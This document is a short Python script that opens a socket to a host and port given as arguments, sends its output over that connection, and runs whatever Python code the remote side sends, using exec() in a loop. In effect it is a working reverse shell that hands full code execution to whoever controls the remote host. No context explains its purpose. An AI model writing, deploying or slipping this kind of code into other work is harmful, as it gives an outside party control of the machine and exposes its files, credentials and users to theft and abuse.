import socket, sys

if len(sys.argv) < 3:
    print("USAGE: ip port")
    exit()
ip = sys.argv[1]
port = int(sys.argv[2])

s = socket.socket()
s.connect((ip, port))

print(f"Connecting to {ip} {port}")

stdout = s.makefile('w')
stderr = s.makefile('w')
stdin = s.makefile("rb")
sys.stdout = stdout
sys.stderr = stderr

def sread():
    lines = []
    while stdin.peek():
        data = stdin.readline()
        if data == b"\x04\n" or data == b"\x04\r\n": break
        lines.append(data)
    return b"".join(lines)

def lprint(string):
    sys.__stdout__.write(str(string))
    sys.__stdout__.flush()

try:
    while True:
        socket_input = sread()
        socket_input = socket_input.decode().strip()
        exec(socket_input)
        stdout.write("\x04\n")
        stdout.flush()
        stderr.flush()
except (KeyboardInterrupt, SystemExit):
    exit()
